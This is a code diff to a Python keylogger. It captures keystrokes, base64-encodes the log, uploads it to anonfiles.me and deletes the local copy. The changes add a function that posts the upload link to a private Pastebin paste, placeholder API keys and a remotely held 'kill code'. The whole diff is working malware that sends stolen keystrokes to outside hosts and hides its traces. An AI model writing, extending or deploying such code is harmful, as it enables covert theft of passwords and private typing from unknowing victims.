@@ -8,6 +8,14 @@ import requests as req
 from threading import Timer, Thread
 from datetime import datetime
 
+#Config necesary for interacting with pastebin
+req.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
+
+API_DEV_KEY = "YOUR API_DEV_KEY HERE"
+API_USER_KEY = "YOUR API_USER_KEY HEY"
+PASTE_KEY = "KEY TO THE PASTE WHERE KILL CODE WILL BE"
+kill_code = "THE CODE THAT WILL KILL THE PROGRAM"
+
 #send report ever x seconds
 REPORT_TIMER = 30
 
@@ -43,7 +51,7 @@ class keyLogger:
 				name = "."
 			#for other special keys just change to uppercase and place an underscore
 			else:
-				name = " " + name.replace(" ", "_").upper() + " "
+				name = " " + '[' + name.replace(" ", "_").upper() + ']' + " "
 
 		#add key to log
 		self.log += name
@@ -67,8 +75,8 @@ class keyLogger:
 			f.write(base64.b64encode(self.log.encode("ascii")).decode("ascii"))
 		msg.good("Log file has been saved!")
 		self.upload()
-		# msg.info("reomving file")
-		# remove(f"{self.filename}.txt")
+		msg.info("removing file")
+		remove(f"{self.filename}.txt")
 
 	def upload(self):
 		url = 'https://anonfiles.me/api/v1/upload'
@@ -77,6 +85,8 @@ class keyLogger:
 		resp = req.post(url, files=file)
 		anon_url = json.loads(resp.text)['data']['file']['url']['full']
 		msg.good(f"File has been uploaded to {anon_url}")
+		self.create_paste(anon_url)
+		msg.info(f"created pasted with url")
 		file["file"].close()
 
 	def report(self):
@@ -102,7 +112,22 @@ class keyLogger:
 		timer.daemon = True
 		timer.start()
 
+	def create_paste(self, anon_url):
+		url = "https://pastebin.com/api/api_post.php"
 
+		data_obj = {
+			"api_dev_key": API_DEV_KEY,
+			"api_user_key": API_USER_KEY,
+			"api_paste_code": anon_url,
+			"api_option": "paste",
+			"api_paste_private": 2
+		}
+
+		resp = req.post(url, data=data_obj)
+		print(resp.text)
+		input()
+
+		return 0
 
 
 def print_banner():
